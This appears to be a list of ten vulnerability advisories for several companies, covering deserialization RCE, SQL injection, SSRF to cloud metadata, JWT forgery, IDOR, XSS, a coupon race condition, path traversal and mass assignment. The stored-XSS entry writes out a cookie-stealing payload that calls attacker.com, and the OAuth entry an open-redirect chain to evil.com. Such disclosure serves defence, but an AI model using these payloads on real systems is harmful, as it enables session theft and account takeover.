CVE-2026-4521
Title: Remote Code Execution via Insecure Deserialization in Java RMI Gateway
Impact: High
Company: TechNova Corp
Description: Insecure deserialization in the Java RMI gateway allowed unauthenticated attackers to execute arbitrary code on the application server. The vulnerability was exploited through a crafted serialized Java object sent to the RMI registry port 1099, bypassing firewall rules that only filtered HTTP traffic. A custom ysoserial gadget chain was developed using the Apache Commons Collections library bundled with the application.
Date: 2026-03-15

---

CVE-2026-3891
Title: SQL Injection in User Profile Endpoint Leading to Database Dump
Impact: High
Company: SkyGrid Systems
Description: A blind time-based SQL injection was discovered in the `/api/users/profile?id=` endpoint. The `id` parameter was not properly sanitized before being passed to the SQL query. Using `sqlmap` with custom tamper scripts, the entire user database (3.2M records) was extracted including bcrypt-hashed passwords, email addresses, and PII data.
Date: 2026-02-20

---

CVE-2026-2745
Title: SSRF to Internal Metadata Service via Image Proxy
Impact: Medium
Company: CloudPulse Inc
Description: The image proxy service at `/proxy/image?url=` failed to validate the target URL scheme and destination. Attackers could use `file://`, `gopher://`, and `dict://` schemes to read local files and interact with internal services. Most critically, the AWS metadata endpoint `http://169.254.169.254/latest/meta-data/` was accessible, leaking IAM credentials with S3 read/write permissions.
Date: 2026-01-10

---

BUG-0192
Title: Authentication Bypass via JWT Algorithm Confusion
Impact: High
Company: NetShield Security
Description: The JWT validation library did not enforce the expected signing algorithm. An attacker could change the `alg` header from `RS256` to `HS256` and sign a forged token using the public RSA key (which is typically public). This allowed privilege escalation from a regular user to admin by forging tokens with `role: admin` claims.
Date: 2025-12-05

---

BUG-0187
Title: IDOR in Invoice Download Exposing All Customer Invoices
Impact: Medium
Company: FinLedger Solutions
Description: The invoice download endpoint `/api/invoices/{id}/pdf` used sequential integer IDs without any authorization checks. By iterating through IDs, an attacker could download all invoices from any customer, including those from competing businesses. Over 50,000 invoices were accessible. The issue was fixed by implementing server-side ownership verification.
Date: 2025-11-18

---

BUG-0173
Title: Stored XSS via Markdown Renderer in Comment System
Impact: Medium
Company: DevConnect Platform
Description: The comment system allowed Markdown input but the HTML sanitization library (DOMPurify) was configured with an incomplete allowlist. An attacker injected `<svg><animate onbegin="fetch('//attacker.com/'+document.cookie)">` which was not stripped by the sanitizer. This allowed cookie theft from any user viewing the comment, including admin sessions.
Date: 2025-10-02

---

BUG-0155
Title: Race Condition in Coupon Application Leading to Double Discount
Impact: Low
Company: ShopFast E-Commerce
Description: A TOCTOU (Time-of-check Time-of-use) race condition in the coupon validation flow allowed applying the same 50% discount coupon multiple times before the first usage was recorded. By sending parallel POST requests with the same coupon code, the discount was applied 4x, resulting in a 93.75% total discount. Maximum financial impact estimated at $12,000 in potential losses.
Date: 2025-08-22

---

CVE-2025-8934
Title: Path Traversal to RCE via File Upload Rename Function
Impact: High
Company: DataVault Storage
Description: The file upload feature allowed renaming files after upload, but the rename function was vulnerable to path traversal via `../` sequences. Combined with the ability to upload `.jsp` files to a directory accessible by the Tomcat server, this resulted in unauthenticated remote code execution. The full server was compromised within 15 minutes of discovery.
Date: 2025-07-14

---

BUG-0141
Title: OAuth Redirect URI Validation Bypass via Open Redirect Chain
Impact: Medium
Company: SocialSync App
Description: The OAuth flow validated the `redirect_uri` parameter against a whitelist, but an open redirect existed at a whitelisted domain. By chaining the OAuth code flow with the open redirect (`/logout?next=//evil.com`), an attacker could steal authorization codes. Combined with the lack of PKCE, this allowed full account takeover of any user clicking a crafted link.
Date: 2025-06-08

---

BUG-0128
Title: Mass Assignment Allowing Free Plan to Enterprise Upgrade
Impact: Low
Company: SaaSBooster Inc
Description: The `/api/user/subscription` PATCH endpoint blindly assigned any property in the request body to the user's subscription object. By adding `{"plan": "enterprise", "billing_cycle": "lifetime", "price": 0}`, a free-tier user could upgrade to the enterprise plan at no cost. The API used `Object.assign()` without an allowlist of permitted fields.
Date: 2025-04-30
